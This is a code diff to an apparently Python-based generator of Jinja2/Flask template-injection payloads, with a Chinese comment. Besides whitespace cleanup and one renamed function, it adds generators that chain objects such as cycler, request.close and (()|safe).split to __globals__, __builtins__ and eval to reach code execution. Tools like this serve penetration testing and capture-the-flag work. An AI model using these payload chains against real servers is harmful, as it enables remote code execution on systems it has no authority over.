@@ -194,7 +194,7 @@ class PayloadGenerator:
                 self.used_count[k] += gen_weight_default[k]
         self.environment = environment
         self.callback = callback if callback else (lambda x, y: None)
-    
+
     def generate_by_list(
         self, targets: List[Target]
     ) -> Union[PayloadGeneratorResult, None]:
@@ -1161,7 +1161,6 @@ def gen_string_2(context: dict, value: str):
     return [(LITERAL, '"{}"'.format("".join(chars)))]
 
 
-
 @expression_gen
 def gen_string_context(context: dict, value: str):
     if value not in context.values():
@@ -1208,7 +1207,6 @@ def gen_string_twostringconcat2(context: dict, value: str):
     ]
 
 
-
 @expression_gen
 def gen_string_removedunder(context: dict, value: str):
     if not re.match("^__[A_Za-z0-9_]+__$", value):
@@ -1226,8 +1224,8 @@ def gen_string_removedunder(context: dict, value: str):
     ]
 
 
-
 # 以下规则生成的payload显著长于原string
+
 
 @expression_gen
 def gen_string_x1(context: dict, value: str):
@@ -1335,8 +1333,6 @@ def gen_string_lowerfilter2(context: dict, value: str):
         return [(UNSATISFIED,)]
     chars = [c if c != '"' else '\\"' for c in value.upper()]
     return [(LITERAL, '"{}"|lower'.format("".join(chars)))]
-
-
 
 
 @expression_gen
@@ -1708,8 +1704,9 @@ def gen_eval_func_g(context):
         )
     ]
 
+
 @expression_gen
-def gen_eval_func_g(context):
+def gen_eval_func_g_get(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
@@ -1734,6 +1731,7 @@ def gen_eval_func_session(context):
             (ITEM, "eval"),
         )
     ]
+
 
 @expression_gen
 def gen_eval_func_lipsum(context):
@@ -1763,6 +1761,20 @@ def gen_eval_func_joiner(context):
 
 
 @expression_gen
+def gen_eval_func_cycler(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "cycler"),
+            (ATTRIBUTE, "__init__"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
+
+
+@expression_gen
 def gen_eval_func_namespace(context):
     return [
         (
@@ -1775,6 +1787,7 @@ def gen_eval_func_namespace(context):
         )
     ]
 
+
 @expression_gen
 def gen_eval_func_request(context):
     return [
@@ -1782,6 +1795,59 @@ def gen_eval_func_request(context):
             CHAINED_ATTRIBUTE_ITEM,
             (FLASK_CONTEXT_VAR, "request"),
             (ATTRIBUTE, "close"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
+
+
+@expression_gen
+def gen_eval_func_safesplit(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "(()|safe)"),
+            (ATTRIBUTE, "split"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
+
+@expression_gen
+def gen_eval_func_safejoin(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "(()|safe)"),
+            (ATTRIBUTE, "join"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
+
+@expression_gen
+def gen_eval_func_safelower(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "(()|safe)"),
+            (ATTRIBUTE, "lower"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
+
+@expression_gen
+def gen_eval_func_safezfill(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "(()|safe)"),
+            (ATTRIBUTE, "zfill"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "__builtins__"),
             (ITEM, "eval"),
